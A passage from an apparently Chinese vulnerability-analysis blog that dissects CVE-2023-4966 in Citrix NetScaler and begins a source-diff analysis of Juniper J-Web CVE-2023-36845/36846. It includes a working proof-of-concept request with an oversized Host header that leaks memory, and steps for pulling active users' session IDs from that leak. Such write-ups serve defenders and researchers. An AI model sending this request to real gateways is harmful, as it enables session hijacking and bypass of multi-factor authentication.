authv2_json_resp = <span class="number">0</span>;</span><br><span class="line">    v13 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v14 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">32</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过对比可以清晰的看到，新版本对 snprintf 返回值进行了长度检查，不允许超过 0x1FFFF，而逆向发现 print_temp_rule 缓冲区的大小刚好是 0x20000。</p>
<p>分析代码定义，这两个函数分别是 <code>/oauth/rp/.well-known/openid-configuration</code> 和 <code>/oauth/idp/.well-known/openid-configuration</code> 的 handler，发包测试这两个 URL，返回信息如下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 发送的数据</span><br><span class="line">GET /oauth/rp/.well-known/openid-configuration HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 返回的数据</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">X-XSS-Protection: 1; mode=block</span><br><span class="line">Content-Length: 308</span><br><span class="line">Cache-control: no-cache, no-store, must-revalidate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">X-Citrix-Application: Receiver for Web</span><br><span class="line"></span><br><span class="line">&#123;&quot;login_endpoint&quot;: &quot;https://127.0.0.1/oauth/login&quot;, &quot;jwks_uri&quot;: &quot;https://127.0.0.1/oauth/rp/certs&quot;, &quot;response_types_supported&quot;: [&quot;code&quot;, &quot;token&quot;, &quot;id_token&quot;], &quot;id_token_signing_alg_values_supported&quot;: [&quot;RS256&quot;], &quot;end_session_endpoint&quot;: &quot;https://127.0.0.1/cgi/tmlogout&quot;, &quot;frontchannel_logout_supported&quot;: false&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 发送的数据</span><br><span class="line">GET /oauth/idp/.well-known/openid-configuration HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 返回的数据</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">X-XSS-Protection: 1; mode=block</span><br><span class="line">Content-Length: 687</span><br><span class="line">Cache-control: no-cache, no-store, must-revalidate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">X-Citrix-Application: Receiver for Web</span><br><span class="line"></span><br><span class="line">&#123;&quot;issuer&quot;: &quot;https://127.0.0.1&quot;, &quot;authorization_endpoint&quot;: &quot;https://127.0.0.1/oauth/idp/login&quot;, &quot;token_endpoint&quot;: &quot;https://127.0.0.1/oauth/idp/token&quot;, &quot;jwks_uri&quot;: &quot;https://127.0.0.1/oauth/idp/certs&quot;, &quot;response_types_supported&quot;: [&quot;code&quot;, &quot;token&quot;, &quot;id_token&quot;], &quot;id_token_signing_alg_values_supported&quot;: [&quot;RS256&quot;], &quot;end_session_endpoint&quot;: &quot;https://127.0.0.1/oauth/idp/logout&quot;, &quot;frontchannel_logout_supported&quot;: true, &quot;scopes_supported&quot;: [&quot;openid&quot;, &quot;ctxs_cc&quot;], &quot;claims_supported&quot;: [&quot;sub&quot;, &quot;iss&quot;, &quot;aud&quot;, &quot;exp&quot;, &quot;iat&quot;, &quot;auth_time&quot;, &quot;acr&quot;, &quot;amr&quot;, &quot;email&quot;, &quot;given_name&quot;, &quot;family_name&quot;, &quot;nickname&quot;], &quot;userinfo_endpoint&quot;: &quot;https://127.0.0.1/oauth/idp/userinfo&quot;, &quot;subject_types_supported&quot;: [&quot;public&quot;]&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到代码把请求中的 Host 请求头使用 snprintf 拼接到 json 字符串中，然后返回给用户。这里涉及一个 C 语言常见的问题，根据手册，snprintf 函数的返回值是待拷贝源数据的长度，而不是实际拷贝的数据长度。因此，假设用户传递的 Host 请求头长度超过了 0x20000，在进行数据拼接时 snprintf 函数会返回超过 0x20000 的值，后续代码调用 ns_vpn_send_response 函数输出数据时使用的数据长度超出了缓冲区 print_temp_rule 的大小，可能导致越界读取造成内存信息泄露。</p>
<p>理论如此，但实际测试会发现，Host 请求头最长只能达到 0x60ec，对于 <code>ns_aaa_oauthrp_send_openid_config</code> 函数来说，Host 请求头会被复制 3 次，最大长度只能达到 0x12500，小于 print_temp_rule 缓冲区的大小，所以第一个函数可能是无法利用的。</p>
<p>但对于第二个函数，观察发现 Host 请求头被拷贝了 6 次，那么拷贝时源数据最大长度可以达到 0x24500，显然超过了 print_temp_rule 缓冲区的大小，可能导致内存泄露。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们已经定位到代码问题，接下来构造 PoC 进行测试，构造如下请求</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /oauth/idp/.well-known/openid-configuration HTTP/1.1</span><br><span class="line">Host: &lt;&quot;a&quot; * 0x6000&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>将请求发送到服务器，检查响应时发现从 0x20110 字节开始输出了内存数据</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-4966-3.png"
                     
                ></p>
<p>这说明我们的分析是正确的，这个接口确实存在内存信息泄露的问题。</p>
<p>但是进一步检查输出的数据，并没有发现存在用户密码或类似的敏感信息，参考 Mandiant 的<a class="link"   href="https://www.mandiant.com/resources/blog/remediation-netscaler-adc-gateway-cve-2023-4966" >文档<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>提到，在野攻击者利用这个漏洞实现 session 劫持，是否需要有活跃的 VPN 用户才能利用此漏洞呢？</p>
<p>打开 Gateway 登录界面，登录之前配置的用户，登录后进入如下页面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-4966-4.png"
                     
                ></p>
<p>打开开发者工具(或者抓包)，可以看到此时请求中已经具有了 session 信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-4966-5.png"
                     
                ></p>
<p>再发送我们构造的 payload，检查内存看到了相同的 session ID</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-4966-6.png"
                     
                ></p>
<p>这样我们就成功利用信息泄露漏洞获取了活跃用户的 session，理论上利用此 session 即可登录 VPN 服务，不过 Citrix Gateway 的后续配置比较复杂，感兴趣的朋友可以自行分析。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>CVE-2023-4966 的利用前提是需要有活跃的 VPN 用户，攻击者获取该用户的 session 后可以绕过多重身份验证登录到 VPN 服务中，从而访问更多敏感资源。由于一般情况下 VPN 用户数量众多，利用该漏洞能否获取以及获取的 session 是否有效要视具体环境而定，因此该漏洞在实际场景下可能存在一定的运气成分。</p>
<p>不过鉴于已经检测到该漏洞的在野利用情况，建议 Citrix ADC 和 NetScaler Gateway 用户尽快更新官方补丁，并执行官方提供的修复措施。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a class="link"   href="https://attackerkb.com/topics/si09VNJhHh/cve-2023-3519/rapid7-analysis" >https://attackerkb.com/topics/si09VNJhHh/cve-2023-3519/rapid7-analysis<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://support.citrix.com/article/CTX579459" >https://support.citrix.com/article/CTX579459<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.mandiant.com/resources/blog/remediation-netscaler-adc-gateway-cve-2023-4966" >https://www.mandiant.com/resources/blog/remediation-netscaler-adc-gateway-cve-2023-4966<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2023-36845 &amp; CVE-2023-36846</title>
    <url>/2023/08/25/CVE-2023-36845-36846/</url>
    <content><![CDATA[<p>2023 年 8 月，Juniper Networks 发布了影响 EX 和 SRX 中 J-Web 组件的远程代码执行漏洞相关信息，本次公开有 4 个漏洞，其中 CVE-2023-36845 &amp; CVE-2023-36846 影响 SRX 系列设备，本文对这两个漏洞进行分析。</p>
<span id="more"></span>

<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>镜像下载，这里提供 22.1R2.10 版本：<a class="link"   href="https://pan.baidu.com/s/1muIiz7kkIrZA3qIV7lh13A" >https://pan.baidu.com/s/1muIiz7kkIrZA3qIV7lh13A<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> (haxn)</p>
<p>部署后开机，等待系统初始化完成，使用默认用户 root:空密码 登录到后台，注意到 root 登录后会直接进入 linux shell。</p>
<p>先输入命令 <code>cli</code>，进入控制界面，然后执行以下命令</p>
<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">configure</span><br><span class="line">set system root-authentication plain-text-password</span><br><span class="line">commit</span><br><span class="line"></span><br><span class="line">set interfaces ge-0/0/1 unit 0 family inet address 192.168.88.150/24</span><br><span class="line">set security zones security-zone trust</span><br><span class="line">set security zones security-zone trust interfaces ge-0/0/1.0</span><br><span class="line">set security zones security-zone trust interfaces ge-0/0/1.0 host-inbound-traffic system-services ping</span><br><span class="line">set security zones security-zone trust interfaces ge-0/0/1.0 host-inbound-traffic system-services ssh</span><br><span class="line">set security zones security-zone trust interfaces ge-0/0/1.0 host-inbound-traffic system-services http</span><br><span class="line">set security zones security-zone trust interfaces ge-0/0/1.0 host-inbound-traffic system-services https</span><br><span class="line">set system services web-management http interface ge-0/0/1.0</span><br><span class="line">set system services web-management https system-generated-certificate</span><br><span class="line">set system services web-management https interface ge-0/0/1.0</span><br><span class="line">set system services ssh root-login allow</span><br><span class="line">commit</span><br></pre></td></tr></table></figure></div>

<p>配置好后访问 IP:443 就可以看到 J-Web 登录页面，登录账户为 root:刚刚设置的密码。</p>
<h2 id="CVE-2023-36846"><a href="#CVE-2023-36846" class="headerlink" title="CVE-2023-36846"></a>CVE-2023-36846</h2><p>首先来看第二个漏洞，CVE 链接：<a class="link"   href="https://www.cve.org/CVERecord?id=CVE-2023-36846" >https://www.cve.org/CVERecord?id=CVE-2023-36846<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>根据描述可知这是一个文件上传漏洞，攻击者可以通过某个无需身份验证的接口向文件系统某位置上传文件。</p>
<p>SRX 的 J-Web 组件所在目录为 <code>/packages/mnt/jweb-srxtvp-8ae76b91/jail</code>，这是一个 chroot 目录，J-Web 默认运行在 nobody 权限。</p>
<p>web 相关代码位于 html 目录下，我们将已经修复的版本和旧版本代码进行比较，排除一些无关改动之后可以定位到文件 <code>slipstream/preferences/user.php</code>，列举新旧两个版本的代码如下：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// new</span></span><br><span class="line"><span class="comment">#!/usr/bin/php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;../../main.inc.php&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;USER_PREFERENCE_FILE&#x27;</span>, <span class="string">&#x27;/var/tmp/preference&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http_method</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. Cannot find a valid session.&quot;&#125;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. Cannot identify user.&quot;&#125;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$http_method</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;GET&quot;</span> :</span><br><span class="line">        <span class="title function_ invoke__">get_user_preferences</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;PUT&quot;</span> :</span><br><span class="line">        <span class="title function_ invoke__">put_user_preferences</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;POST&quot;</span> :</span><br><span class="line">        <span class="title function_ invoke__">put_user_preferences</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;DELETE&quot;</span> :</span><br><span class="line">        <span class="title function_ invoke__">delete_user_preferences</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">//echo (&quot;default...&quot;);</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_user_preference_file</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;   </span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">get_preference_file_path</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$samplejson</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$fp</span>) &#123;       </span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$samplejson</span>);</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="title function_ invoke__">chmod</span>(USER_PREFERENCE_FILE, <span class="number">0666</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_preference_file_path</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (USER_PREFERENCE_FILE . <span class="string">&quot;.&quot;</span> . <span class="variable">$username</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_user_preferences</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">get_preference_file_path</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="comment">//print(&quot;&lt;br/&gt; file = &quot; . $file);</span></span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>) ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. File not found.&quot;&#125;&#x27;</span>);</span><br><span class="line">		<span class="title function_ invoke__">write_dummy_content</span>();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">	  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>, <span class="string">&quot;opening file for reading ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$fp</span>, <span class="literal">true</span>));</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">is_bool</span>(<span class="variable">$fp</span>) &amp;&amp; <span class="variable">$fp</span> == <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. File open failed.&quot;&#125;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">	  <span class="keyword">if</span>(<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, LOCK_SH)) &#123;</span><br><span class="line">		  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;Unlocked the file for reading ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$fp</span>, <span class="literal">true</span>));</span><br><span class="line">		  <span class="variable">$str</span> = <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$fp</span>);</span><br><span class="line">	  &#125;     </span><br><span class="line">      </span><br><span class="line">      <span class="variable">$fw</span> = <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">	  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;closing file for reading ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$fw</span>, <span class="literal">true</span>));</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(!<span class="title function_ invoke__">is_bool</span>(<span class="variable">$str</span>) &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>)&gt;<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$str</span>);</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;&#123;&#125;&quot;</span>);</span><br><span class="line">		<span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;error while reading ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$str</span>, <span class="literal">true</span>));</span><br><span class="line">	  &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> ( <span class="built_in">Exception</span> <span class="variable">$e</span> ) &#123;</span><br><span class="line">      <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error.&#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&#x27;&quot;&#125;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write_dummy_content</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	 <span class="keyword">global</span> <span class="variable">$payload</span>;</span><br><span class="line">	 <span class="variable">$payload</span> = <span class="string">&quot;&#123;&#125;&quot;</span>;</span><br><span class="line">	 <span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">	 <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$username</span>))</span><br><span class="line">		 <span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">	 <span class="title function_ invoke__">put_user_preferences</span>(<span class="variable">$username</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">put_user_preferences</span> (<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">get_preference_file_path</span>(<span class="variable">$username</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;	  </span><br><span class="line">      <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$file</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">      <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;opening file for writing ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$fp</span>, <span class="literal">true</span>));</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">is_bool</span>(<span class="variable">$fp</span>) &amp;&amp; <span class="variable">$fp</span> == <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. File open failed.&quot;&#125;&#x27;</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		  <span class="keyword">if</span> (<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, LOCK_EX)) &#123;</span><br><span class="line">			  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;File locked! ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$fp</span>, <span class="literal">true</span>));</span><br><span class="line">			  <span class="variable">$fw</span> = <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$payload</span>);</span><br><span class="line">			  <span class="keyword">if</span>(<span class="title function_ invoke__">is_bool</span>(<span class="variable">$fw</span>) &amp;&amp; <span class="variable">$fw</span> == <span class="literal">FALSE</span>) &#123;</span><br><span class="line">				  <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. File writing failed.&quot;&#125;&#x27;</span>);</span><br><span class="line">			  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;Payload written to file ... of &quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$fw</span>, <span class="literal">true</span>) . <span class="string">&quot; bytes&quot;</span>);</span><br><span class="line">			  &#125;</span><br><span class="line">			  <span class="keyword">if</span>(<span class="title function_ invoke__">flock</span>(<span class="variable">$fp</span>, LOCK_UN)) &#123;</span><br><span class="line">				  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;File unlocked! ...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$fp</span>, <span class="literal">true</span>));</span><br><span class="line">			  &#125;</span><br><span class="line">			  <span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;<span class="subst">$file</span> was last modified: &quot;</span> . <span class="title function_ invoke__">date</span> (<span class="string">&quot;F d Y H:i:s.&quot;</span>, <span class="title function_ invoke__">filemtime</span>(<span class="variable">$file</span>)));</span><br><span class="line">		  &#125;        </span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Success - Updated preferences for user&quot;&#125;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> ( <span class="built_in">Exception</span> <span class="variable">$e</span> ) &#123;</span><br><span class="line">      <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error.&#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&#x27;&quot;&#125;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="variable">$fc</span> = <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">	<span class="title function_ invoke__">print_log</span>(<span class="keyword">__FUNCTION__</span>,<span class="string">&quot;closing file...&quot;</span> . <span class="title function_ invoke__">print_r</span>(<span class="variable">$file</span>, <span class="literal">true</span>) . <span class="string">&quot; status &quot;</span> .  <span class="title function_ invoke__">print_r</span>(<span class="variable">$fc</span>, <span class="literal">true</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delete_user_preferences</span> (<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$payload</span>;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">get_preference_file_path</span>(<span class="variable">$username</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Success - Updated preferences for user&quot;&#125;&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> ( <span class="built_in">Exception</span> <span class="variable">$e</span> ) &#123;</span><br><span class="line">      <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error.&#x27;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>() . <span class="string">&#x27;&quot;&#125;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_log</span>(<span class="params"><span class="variable">$fname</span>, <span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">	<span class="title function_ invoke__">error_log</span>(<span class="variable">$fname</span> . <span class="string">&quot; : &quot;</span> . <span class="variable">$msg</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>



<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// old</span></span><br><span class="line"><span class="comment">#!/usr/bin/php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;../../main.inc.php&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">user</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;USER_PREFERENCE_FILE&#x27;</span>, <span class="string">&#x27;/var/tmp/preference&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$http_method</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. Cannot find a valid session.&quot;&#125;&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$username</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> (<span class="string">&#x27;&#123;&quot;status&quot;: &quot;Error - Internal error. Cannot identify user.&quot;&#125;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$http_method</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;GET&quot;</span> :</span><br><span class="line">        <span class="title function_ invoke__">get_user_preferences</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;PUT&quot;</span> :</span><br><span class="line">        <span class="title function_ invoke__">put_user_preferences</span>(<span class="variable">$username</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;POST&quot;</span> :</span><br><span class="line">        